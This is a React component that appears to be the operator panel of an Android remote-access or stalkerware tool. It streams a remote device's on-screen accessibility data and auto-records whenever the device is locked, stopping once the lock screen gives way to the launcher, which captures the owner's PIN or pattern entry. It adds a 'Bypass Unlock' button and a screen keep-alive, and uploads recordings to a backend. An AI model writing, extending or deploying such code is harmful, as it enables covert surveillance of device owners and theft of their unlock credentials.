import React, { useState, useRef, useEffect, useCallback } from 'react';

const PHONE_W = 320;
const PHONE_H = 680;
const LOCK_PKG = 'com.android.systemui';
const MAX_RECORDINGS = 100;

const LAUNCHER_PKGS = new Set([
  'com.android.launcher', 'com.android.launcher2', 'com.android.launcher3',
  'com.google.android.apps.nexuslauncher', 'com.miui.home', 'com.huawei.android.launcher',
  'com.sec.android.app.launcher', 'com.oppo.launcher', 'com.vivo.launcher',
  'com.oneplus.launcher', 'com.realme.launcher', 'com.zte.mifavor.launcher',
]);

function isLauncherPkg(pkg) {
  if (!pkg) return false;
  if (LAUNCHER_PKGS.has(pkg)) return true;
  if (pkg.includes('launcher') || pkg.includes('home')) return true;
  return false;
}

function renderFrameElements(screenData, devW, devH) {
  if (!screenData) return null;
  const elements = (screenData.elements || []).filter(
    el => el.text || el.contentDescription || el.hintText || el.clickable || el.editable
  );
  const scX = PHONE_W / devW;
  const scY = PHONE_H / devH;

  const getStyle = (el) => {
    if (el.editable)  return { border: '1.5px solid #3b82f6', background: 'rgba(59,130,246,0.12)' };
    if (el.clickable) return { border: '1px solid rgba(34,197,94,0.5)',  background: 'rgba(34,197,94,0.07)' };
    if (el.selected || el.checked) return { border: '1px solid rgba(234,179,8,0.5)', background: 'rgba(234,179,8,0.07)' };
    if (el.text || el.contentDescription) return { border: '1px solid rgba(148,163,184,0.16)', background: 'transparent' };
    return { border: '1px dashed rgba(100,116,139,0.12)', background: 'transparent' };
  };

  return [...elements]
    .filter(el => el.bounds)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const aB = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aB - aA;
    })
    .map((el, i) => {
      const left   = el.bounds.left * scX;
      const top    = el.bounds.top  * scY + 20;
      const width  = (el.bounds.right  - el.bounds.left) * scX;
      const height = (el.bounds.bottom - el.bounds.top)  * scY;
      if (width < 2 || height < 2) return null;
      const label = (el.text || el.contentDescription || el.hintText || '').slice(0, 32);
      return (
        <div
          key={i}
          style={{
            position: 'absolute', left, top, width, height,
            ...getStyle(el),
            borderRadius: 3, boxSizing: 'border-box', overflow: 'hidden',
            display: 'flex', alignItems: 'center', padding: '0 2px',
          }}
        >
          {height > 10 && label && (
            <span style={{
              fontSize: Math.min(Math.max(height * 0.36, 6.5), 9.5),
              color: el.editable ? '#93c5fd' : el.clickable ? '#86efac' : '#cbd5e1',
              whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis',
              lineHeight: 1.2, pointerEvents: 'none',
              fontWeight: el.clickable ? 600 : 400,
            }}>
              {label}
            </span>
          )}
        </div>
      );
    });
}

function addRecording(prev, rec) {
  const next = [rec, ...prev];
  if (next.length > MAX_RECORDINGS) {
    return next.slice(0, MAX_RECORDINGS);
  }
  return next;
}

export default function ScreenReaderRecorder({ device, sendCommand, results, screenReaderPushData, offlineRecordingVersion }) {
  const deviceId = device?.deviceId;
  const isOnline = device?.isOnline;
  const info     = device?.deviceInfo || {};
  const devW     = info.screenWidth  || 1080;
  const devH     = info.screenHeight || 2340;

  const [isRecording, setIsRecording]     = useState(false);
  const [recordings, setRecordings]       = useState([]);
  const [currentFrames, setCurrentFrames] = useState([]);
  const [loadingRecs, setLoadingRecs]     = useState(false);

  const [playing, setPlaying]       = useState(null);
  const [playIdx, setPlayIdx]       = useState(0);
  const [isPlaying, setIsPlaying]   = useState(false);
  const [playSpeed, setPlaySpeed]   = useState(500);

  // Keep-alive: periodically send wake_screen so the device stays on until toggled off
  const [keepAlive, setKeepAlive]   = useState(false);
  const keepAliveTimerRef           = useRef(null);

  const isRecordingRef  = useRef(false);
  const framesRef       = useRef([]);
  const playTimerRef    = useRef(null);
  const prevPkgRef      = useRef(null);
  const startTimeRef    = useRef(null);
  const seenRecordingIds = useRef(new Set());

  useEffect(() => { isRecordingRef.current = isRecording; }, [isRecording]);

  useEffect(() => {
    if (!results || !isOnline) return;
    const relevant = results.filter(r =>
      (r.command === 'list_screen_recordings' || r.command === 'get_screen_recording') &&
      r.success && r.response
    );
    relevant.forEach(r => {
      if (seenRecordingIds.current.has(r.id)) return;
      seenRecordingIds.current.add(r.id);
      try {
        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
        if (r.command === 'list_screen_recordings' && data.recordings) {
          data.recordings.forEach(rec => {
            if (rec.filename) {
              sendCommand(deviceId, 'get_screen_recording', { filename: rec.filename });
            }
          });
        }
        if (r.command === 'get_screen_recording' && data.frames && data.filename) {
          setRecordings(prev => {
            const exists = prev.find(p => p.filename === data.filename);
            if (exists) return prev;
            const newRec = {
              id: data.filename,
              filename: data.filename,
              label: data.label || `Recording ${new Date(data.startTime || 0).toLocaleTimeString()}`,
              frames: data.frames || [],
              duration: ((data.endTime || 0) - (data.startTime || 0)) || (data.frameCount || 0) * 1000,
              frameCount: data.frameCount || (data.frames || []).length,
            };
            return [newRec, ...prev].slice(0, 100);
          });
        }
      } catch (_) {}
    });
  }, [results, isOnline, deviceId, sendCommand]);

  const fetchRecordings = useCallback(() => {
    if (!deviceId || !isOnline) return;
    setLoadingRecs(true);
    sendCommand(deviceId, 'list_screen_recordings', {});
    setTimeout(() => setLoadingRecs(false), 3000);
  }, [deviceId, isOnline, sendCommand]);

  useEffect(() => {
    fetchRecordings();
  }, [fetchRecordings]);

  // Re-fetch when an offline recording is uploaded from the device
  useEffect(() => {
    if (offlineRecordingVersion) fetchRecordings();
  }, [offlineRecordingVersion, fetchRecordings]);

  // Periodic refresh every 30 seconds to pick up any recordings saved while away
  useEffect(() => {
    const id = setInterval(() => { if (!isRecordingRef.current) fetchRecordings(); }, 30000);
    return () => clearInterval(id);
  }, [fetchRecordings]);

  const saveRecordingToBackend = useCallback(async (rec) => {
    if (!deviceId) return null;
    try {
      const res = await fetch(`/api/recordings/${encodeURIComponent(deviceId)}/save`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          frames: rec.frames,
          label: rec.label,
          startTime: rec.startTime,
          endTime: rec.endTime,
          frameCount: rec.frameCount,
        }),
      });
      if (!res.ok) return null;
      const data = await res.json();
      return data.filename || null;
    } catch (_) { return null; }
  }, [deviceId]);

  const stopRecording = useCallback(async (frames, sendStopCmd = true) => {
    if (sendStopCmd) sendCommand(deviceId, 'screen_reader_stop', {});
    setIsRecording(false);
    isRecordingRef.current = false;
    const captured = frames || framesRef.current;
    if (captured.length > 0) {
      const now = Date.now();
      const label = `Recording ${new Date().toLocaleTimeString()}`;
      const rec = {
        id: now,
        label,
        frames: captured,
        duration: captured.length * 1000,
        frameCount: captured.length,
        startTime: startTimeRef.current || now,
        endTime: now,
      };
      setRecordings(prev => addRecording(prev, rec));

      saveRecordingToBackend(rec).then(filename => {
        if (filename) {
          setRecordings(prev => prev.map(r =>
            r.id === rec.id ? { ...r, filename } : r
          ));
        }
      });
    }
    framesRef.current = [];
    startTimeRef.current = null;
    setCurrentFrames([]);
    prevPkgRef.current = null;
  }, [deviceId, sendCommand, saveRecordingToBackend]);

  const startRecording = useCallback((auto = false) => {
    framesRef.current = [];
    startTimeRef.current = Date.now();
    setCurrentFrames([]);
    prevPkgRef.current = null;
    if (!auto) {
      sendCommand(deviceId, 'screen_reader_start', {});
    }
    setIsRecording(true);
    isRecordingRef.current = true;
  }, [deviceId, sendCommand]);

  useEffect(() => {
    if (!screenReaderPushData) return;

    const autoEvent = screenReaderPushData.autoEvent;

    if (autoEvent === 'start') {
      framesRef.current = [];
      startTimeRef.current = Date.now();
      setCurrentFrames([]);
      prevPkgRef.current = null;
      setIsRecording(true);
      isRecordingRef.current = true;
      return;
    }

    if (autoEvent === 'stop') {
      if (isRecordingRef.current) {
        stopRecording(framesRef.current, false);
      }
      return;
    }

    if (!isRecordingRef.current) return;
    if (!screenReaderPushData?.success || !screenReaderPushData?.screen) return;

    const screen = screenReaderPushData.screen;
    const pkg    = screen.packageName || '';

    const prevPkg = prevPkgRef.current;
    prevPkgRef.current = pkg;

    const frame = { ts: Date.now(), screen };
    framesRef.current = [...framesRef.current, frame];
    setCurrentFrames([...framesRef.current]);

    if (prevPkg === LOCK_PKG && pkg !== LOCK_PKG && isLauncherPkg(pkg)) {
      stopRecording(framesRef.current);
    }
  }, [screenReaderPushData, stopRecording]);

  const stopPlayback = useCallback(() => {
    clearInterval(playTimerRef.current);
    setIsPlaying(false);
  }, []);

  const startPlayback = useCallback((rec) => {
    clearInterval(playTimerRef.current);
    setPlaying(rec);
    setPlayIdx(0);
    setIsPlaying(true);
    let idx = 0;
    playTimerRef.current = setInterval(() => {
      idx++;
      if (idx >= rec.frames.length) {
        clearInterval(playTimerRef.current);
        setIsPlaying(false);
        setPlayIdx(rec.frames.length - 1);
      } else {
        setPlayIdx(idx);
      }
    }, playSpeed);
  }, [playSpeed]);

  useEffect(() => () => clearInterval(playTimerRef.current), []);

  // Keep-alive: send wake_screen every 25 s while toggled on
  useEffect(() => {
    clearInterval(keepAliveTimerRef.current);
    if (keepAlive && isOnline) {
      sendCommand(deviceId, 'wake_screen', {});
      keepAliveTimerRef.current = setInterval(() => {
        sendCommand(deviceId, 'wake_screen', {});
      }, 25000);
    }
    return () => clearInterval(keepAliveTimerRef.current);
  }, [keepAlive, isOnline, deviceId, sendCommand]);

  // Stop keep-alive when device goes offline or unmounts
  useEffect(() => {
    if (!isOnline) { setKeepAlive(false); clearInterval(keepAliveTimerRef.current); }
  }, [isOnline]);

  const deleteRecording = async (id, filename) => {
    if (playing?.id === id) { stopPlayback(); setPlaying(null); }
    setRecordings(prev => prev.filter(r => r.id !== id));
    if (filename && deviceId) {
      try {
        await fetch(`/api/recordings/${encodeURIComponent(deviceId)}/${encodeURIComponent(filename)}`, {
          method: 'DELETE',
        });
      } catch (_) {}
    }
  };

  const displayFrame = playing
    ? (playing.frames[playIdx]?.screen || null)
    : (currentFrames.length > 0 ? currentFrames[currentFrames.length - 1]?.screen : null);

  const displayPkg = displayFrame?.packageName || '';

  const btn = (label, onClick, bg, disabled = false, extra = {}) => (
    <button
      onClick={onClick}
      disabled={disabled}
      style={{
        border: 'none', borderRadius: 6, padding: '5px 12px',
        background: disabled ? '#1e293b' : bg, color: disabled ? '#475569' : '#f1f5f9',
        cursor: disabled ? 'not-allowed' : 'pointer',
        fontSize: 11, fontWeight: 600, whiteSpace: 'nowrap',
        ...extra,
      }}
    >
      {label}
    </button>
  );

  return (
    <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start', flexWrap: 'wrap' }}>

      {/* Phone Frame */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
        <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, textAlign: 'center' }}>
          {isRecording ? '🔴 Recording…' : playing ? '▶ Playback' : '🎥 Screen Rec'}
        </div>

        <div style={{
          background: '#1e293b', borderRadius: 28, padding: '16px 10px 12px',
          border: `2px solid ${isRecording ? '#dc2626' : playing ? '#7c3aed' : '#334155'}`,
          display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
          boxShadow: isRecording ? '0 0 18px rgba(220,38,38,0.25)' : '0 4px 20px rgba(0,0,0,0.4)',
          transition: 'border-color 0.3s, box-shadow 0.3s',
        }}>
          <div style={{ width: 56, height: 5, background: '#334155', borderRadius: 4, marginBottom: 2 }} />

          <div style={{
            width: PHONE_W, height: PHONE_H,
            background: displayFrame ? '#101828' : '#0a0f1e',
            borderRadius: 8, border: '1px solid #1e293b',
            overflow: 'hidden', position: 'relative',
          }}>
            {!displayFrame && (
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#334155', gap: 8 }}>
                <div style={{ fontSize: 36 }}>🎥</div>
                <div style={{ fontSize: 11, color: '#475569' }}>
                  {isRecording ? 'Waiting for frame…' : playing ? 'No frame' : 'Auto-records when locked'}
                </div>
              </div>
            )}

            {displayFrame && (
              <>
                <div style={{
                  position: 'absolute', top: 0, left: 0, right: 0, height: 20,
                  background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center',
                  padding: '0 8px', zIndex: 50, gap: 4,
                }}>
                  <span style={{ fontSize: 8, color: '#94a3b8', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {displayPkg.split('.').pop() || 'App'}
                  </span>
                  {isRecording && <span style={{ fontSize: 8, color: '#ef4444', fontWeight: 700 }}>● REC</span>}
                  {playing && <span style={{ fontSize: 8, color: '#a78bfa' }}>{playIdx + 1}/{playing.frames.length}</span>}
                </div>

                {renderFrameElements(displayFrame, devW, devH)}
              </>
            )}
          </div>

          {isRecording && (
            <div style={{ fontSize: 10, color: '#ef4444', fontWeight: 700 }}>
              ● {currentFrames.length} frame{currentFrames.length !== 1 ? 's' : ''} captured
            </div>
          )}

          {playing && playing.frames.length > 1 && (
            <div style={{ width: PHONE_W, display: 'flex', flexDirection: 'column', gap: 4 }}>
              <input
                type="range"
                min={0}
                max={playing.frames.length - 1}
                value={playIdx}
                onChange={e => { stopPlayback(); setPlayIdx(Number(e.target.value)); }}
                style={{ width: '100%', accentColor: '#7c3aed' }}
              />
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 9, color: '#475569' }}>
                <span>0s</span>
                <span>{((playIdx * playSpeed) / 1000).toFixed(1)}s</span>
                <span>{((playing.frames.length * playSpeed) / 1000).toFixed(1)}s</span>
              </div>
            </div>
          )}

          <div style={{ width: 60, height: 4, background: '#334155', borderRadius: 4, marginTop: 2 }} />
        </div>

        {/* Record / Playback controls */}
        <div style={{ display: 'flex', gap: 6, justifyContent: 'center', flexWrap: 'wrap' }}>
          {!isRecording ? (
            btn('● Record', () => startRecording(false), '#7f1d1d', !isOnline)
          ) : (
            btn('⏹ Stop', () => stopRecording(), '#dc2626')
          )}

          {playing && (
            <>
              {isPlaying
                ? btn('⏸ Pause', stopPlayback, '#334155')
                : btn('▶ Play',  () => startPlayback(playing), '#4c1d95', playing.frames.length === 0)
              }
              {btn('✕ Close', () => { stopPlayback(); setPlaying(null); }, '#334155')}
            </>
          )}
        </div>

        {/* Bypass Unlock button */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4, alignItems: 'center' }}>
          <button
            disabled={!isOnline}
            onClick={() => {
              if (keepAlive) {
                setKeepAlive(false);
              } else {
                // Turn screen off first (works whether locked or unlocked),
                // then wake it to show lock screen, then open recents
                sendCommand(deviceId, 'screen_off', {});
                setTimeout(() => sendCommand(deviceId, 'wake_screen', {}), 900);
                setTimeout(() => sendCommand(deviceId, 'press_recents', {}), 1600);
                setKeepAlive(true);
              }
            }}
            style={{
              border: 'none', borderRadius: 8, padding: '7px 20px',
              background: keepAlive
                ? 'linear-gradient(135deg,#14532d,#166534)'
                : (isOnline ? 'linear-gradient(135deg,#4c1d95,#6d28d9)' : '#1e293b'),
              color: keepAlive ? '#86efac' : (isOnline ? '#f1f5f9' : '#475569'),
              cursor: isOnline ? 'pointer' : 'not-allowed',
              fontSize: 11, fontWeight: 700, letterSpacing: 0.5,
              boxShadow: keepAlive
                ? '0 0 12px rgba(34,197,94,0.35)'
                : (isOnline ? '0 0 10px rgba(109,40,217,0.3)' : 'none'),
              transition: 'all 0.25s', whiteSpace: 'nowrap',
            }}
          >
            {keepAlive ? '🟢 Stop Bypass' : '🔓 Bypass Unlock'}
          </button>
          {keepAlive && (
            <div style={{ fontSize: 9, color: '#22c55e', textAlign: 'center' }}>
              Screen awake · recents open · keep-alive every 25s
            </div>
          )}
        </div>

        {playing && (
          <div style={{ display: 'flex', gap: 6, alignItems: 'center', justifyContent: 'center' }}>
            <span style={{ fontSize: 10, color: '#475569' }}>Speed:</span>
            <select
              value={playSpeed}
              onChange={e => { setPlaySpeed(Number(e.target.value)); if (isPlaying) { stopPlayback(); startPlayback(playing); } }}
              style={{ background: '#1e293b', color: '#94a3b8', border: '1px solid #334155', borderRadius: 6, padding: '3px 7px', fontSize: 11 }}
            >
              <option value={200}>0.2s/frame</option>
              <option value={500}>0.5s/frame</option>
              <option value={1000}>1s/frame</option>
              <option value={2000}>2s/frame</option>
            </select>
          </div>
        )}
      </div>

      {/* Recordings list */}
      <div style={{ flex: 1, minWidth: 220, display: 'flex', flexDirection: 'column', gap: 6 }}>
        <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, display: 'flex', alignItems: 'center', gap: 8 }}>
          <span>🎞 Recordings ({recordings.length}/{MAX_RECORDINGS})</span>
          {loadingRecs && <span style={{ color: '#475569', fontWeight: 400, fontSize: 9 }}>Loading…</span>}
          <button
            onClick={fetchRecordings}
            disabled={loadingRecs}
            title="Refresh recordings from server"
            style={{
              marginLeft: 'auto', border: 'none', borderRadius: 6,
              padding: '3px 10px', background: '#1e293b',
              color: loadingRecs ? '#475569' : '#94a3b8',
              cursor: loadingRecs ? 'not-allowed' : 'pointer',
              fontSize: 10, fontWeight: 600,
            }}
          >
            {loadingRecs ? '…' : '↻ Get Recordings'}
          </button>
        </div>

        {recordings.length === 0 && !loadingRecs && (
          <div style={{
            background: '#1e293b', borderRadius: 10, border: '1px solid #334155',
            padding: '28px 16px', textAlign: 'center', color: '#475569',
            display: 'flex', flexDirection: 'column', gap: 6, alignItems: 'center',
          }}>
            <span style={{ fontSize: 28 }}>🎞</span>
            <span style={{ fontSize: 12 }}>No recordings yet</span>
            <span style={{ fontSize: 11 }}>Auto-records when device is locked.<br />Stops and saves when unlocked or screen turns off.</span>
          </div>
        )}

        {recordings.map(rec => (
          <div
            key={rec.id}
            style={{
              background: playing?.id === rec.id ? '#1e1b4b' : '#1e293b',
              borderRadius: 10,
              border: `1px solid ${playing?.id === rec.id ? '#7c3aed' : '#334155'}`,
              padding: '10px 12px',
              display: 'flex', flexDirection: 'column', gap: 6,
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <span style={{ fontSize: 13 }}>🎞</span>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontWeight: 600, color: '#e2e8f0', fontSize: 12, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                  {rec.label}
                </div>
                <div style={{ fontSize: 10, color: '#475569', display: 'flex', gap: 8 }}>
                  <span>{rec.frameCount} frames</span>
                  <span>~{(rec.duration / 1000).toFixed(1)}s</span>
                  {rec.filename && <span style={{ color: '#22c55e', fontSize: 9 }}>✓ saved</span>}
                </div>
              </div>
              <button
                onClick={() => {
                  if (playing?.id === rec.id) { stopPlayback(); setPlaying(null); }
                  else { startPlayback(rec); }
                }}
                style={{
                  border: 'none', borderRadius: 6, padding: '4px 10px',
                  background: playing?.id === rec.id ? '#7c3aed' : '#4c1d95',
                  color: '#f1f5f9', fontSize: 11, cursor: 'pointer', fontWeight: 600,
                }}
              >
                {playing?.id === rec.id ? '⏏ Viewing' : '▶ View'}
              </button>
              <button
                onClick={() => deleteRecording(rec.id, rec.filename)}
                style={{
                  border: 'none', borderRadius: 6, padding: '4px 8px',
                  background: '#7f1d1d', color: '#f1f5f9',
                  fontSize: 11, cursor: 'pointer', fontWeight: 600,
                }}
              >
                🗑
              </button>
            </div>

            {rec.frameCount > 0 && (
              <div style={{ display: 'flex', gap: 3, overflowX: 'auto', paddingBottom: 2 }}>
                {rec.frames.map((f, fi) => (
                  <div
                    key={fi}
                    onClick={() => {
                      if (playing?.id === rec.id) { stopPlayback(); setPlayIdx(fi); }
                      else { startPlayback(rec); setTimeout(() => { stopPlayback(); setPlayIdx(fi); }, 50); }
                    }}
                    style={{
                      width: 28, height: 48, flexShrink: 0,
                      background: fi === playIdx && playing?.id === rec.id ? '#7c3aed22' : '#0f172a',
                      border: `1px solid ${fi === playIdx && playing?.id === rec.id ? '#7c3aed' : '#1e293b'}`,
                      borderRadius: 4, cursor: 'pointer',
                      display: 'flex', alignItems: 'center', justifyContent: 'center',
                      fontSize: 7, color: '#475569', position: 'relative', overflow: 'hidden',
                    }}
                    title={`Frame ${fi + 1}`}
                  >
                    <span style={{ fontWeight: 700, fontSize: 8, color: fi === playIdx && playing?.id === rec.id ? '#a78bfa' : '#334155' }}>
                      {fi + 1}
                    </span>
                    {f.screen?.packageName && (
                      <div style={{
                        position: 'absolute', bottom: 1, left: 0, right: 0,
                        textAlign: 'center', fontSize: 5, color: '#334155',
                        overflow: 'hidden', whiteSpace: 'nowrap', textOverflow: 'ellipsis',
                        padding: '0 1px',
                      }}>
                        {f.screen.packageName.split('.').pop()}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}
